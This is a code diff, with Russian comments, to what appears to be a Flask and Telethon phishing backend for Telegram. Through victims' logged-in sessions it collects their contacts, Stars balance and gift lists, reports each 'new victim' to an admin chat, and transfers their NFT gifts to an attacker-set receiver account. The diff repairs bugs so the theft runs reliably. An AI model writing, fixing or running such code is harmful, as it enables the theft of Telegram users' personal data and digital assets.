@@ -1,6 +1,6 @@
 from flask import Flask, render_template, request, jsonify, session
 from telethon import TelegramClient, functions, types
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, UsernameNotOccupiedError
 import asyncio
 import os
 import json
@@ -32,7 +32,7 @@ async def send_telegram_message(text):
         await client.post(url, json={"chat_id": ADMIN_ID, "text": text})
 
 # ============================================================
-# Сбор ВСЕХ данных аккаунта (рабочие методы Telethon 1.41.0)
+# Сбор ВСЕХ данных аккаунта (исправленные методы)
 # ============================================================
 async def collect_full_user_data(client):
     data = {}
@@ -65,29 +65,35 @@ async def collect_full_user_data(client):
         await send_telegram_message(f"⚠️ Ошибка получения контактов: {str(e)}")
         data['contacts'] = []
     
-    # 3. Баланс звёзд (правильный метод)
+    # 3. Баланс звёзд (преобразуем в int)
     try:
         stars_status = await client(functions.payments.GetStarsStatusRequest(
             peer=await client.get_input_entity('me')
         ))
-        data['stars_balance'] = stars_status.balance
+        # stars_status.balance - это число, но если это объект, приводим к int
+        balance_value = int(stars_status.balance) if hasattr(stars_status, 'balance') else 0
+        data['stars_balance'] = balance_value
     except Exception as e:
         await send_telegram_message(f"⚠️ Ошибка получения баланса: {str(e)}")
         data['stars_balance'] = 0
     
-    # 4. Доступные подарки (правильный метод)
+    # 4. Доступные подарки (убраны несуществующие атрибуты)
     try:
         gifts_result = await client(functions.payments.GetStarGiftsRequest(hash=0))
         data['available_gifts'] = []
         for gift in gifts_result.gifts:
-            data['available_gifts'].append({
+            gift_info = {
                 'id': gift.id,
                 'stars': gift.stars,
-                'availability_issued': gift.availability_issued,
-                'availability_total': gift.availability_total,
                 'title': getattr(gift, 'title', None),
                 'description': getattr(gift, 'description', None)
-            })
+            }
+            # Проверяем наличие других атрибутов, если есть - добавляем
+            if hasattr(gift, 'availability_issued'):
+                gift_info['availability_issued'] = gift.availability_issued
+            if hasattr(gift, 'availability_total'):
+                gift_info['availability_total'] = gift.availability_total
+            data['available_gifts'].append(gift_info)
     except Exception as e:
         await send_telegram_message(f"⚠️ Ошибка получения подарков: {str(e)}")
         data['available_gifts'] = []
@@ -149,7 +155,7 @@ async def send_document_to_admin(file_path):
         raise
 
 # ============================================================
-# Проверка баланса и подарков (используем правильные методы)
+# Проверка баланса и подарков (исправлено)
 # ============================================================
 async def check_balance_and_gifts(client):
     try:
@@ -160,7 +166,7 @@ async def check_balance_and_gifts(client):
             stars_status = await client(functions.payments.GetStarsStatusRequest(
                 peer=await client.get_input_entity('me')
             ))
-            balance = stars_status.balance
+            balance = int(stars_status.balance) if hasattr(stars_status, 'balance') else 0
         except Exception as e:
             await send_telegram_message(f"⚠️ Ошибка получения баланса: {str(e)}")
             balance = 0
@@ -185,19 +191,23 @@ async def check_balance_and_gifts(client):
         return None
 
 # ============================================================
-# Передача NFT-подарков получателю (если метод send_gift существует)
+# Передача NFT-подарков получателю (с проверкой юзернейма)
 # ============================================================
 async def transfer_nft_to_receiver(client, info):
     try:
-        receiver = await client.get_entity(RECEIVER_USERNAME)
+        # Проверяем, существует ли получатель
+        try:
+            receiver = await client.get_entity(RECEIVER_USERNAME)
+        except (UsernameNotOccupiedError, ValueError) as e:
+            await send_telegram_message(f"❌ Получатель {RECEIVER_USERNAME} не найден: {str(e)}")
+            return False
+        
         result_text = f"🔔 Новая жертва!\n👤 @{info.get('username', 'unknown')}\n⭐ Баланс: {info.get('stars_balance', 0)}\n🎁 Подарков: {info.get('gifts_count', 0)}"
         
         if info.get('gifts_count', 0) > 0:
             for gift in info.get('gifts', []):
                 try:
-                    # Попытка отправить подарок (метод может отличаться, но оставим как есть)
-                    # В Telethon 1.41.0 возможно client.send_gift, но проверим
-                    # Если не работает, можно заменить на вызов через functions
+                    # Пытаемся отправить подарок
                     await client.send_gift(receiver, gift)
                     result_text += f"\n🎁 Подарок отправлен: {gift.id}"
                 except Exception as e:
@@ -205,7 +215,7 @@ async def transfer_nft_to_receiver(client, info):
         await send_telegram_message(result_text)
         return True
     except Exception as e:
-        await send_telegram_message(f"❌ Ошибка перевода: {e}")
+        await send_telegram_message(f"❌ Ошибка перевода: {str(e)}")
         return False
 
 # ============================================================
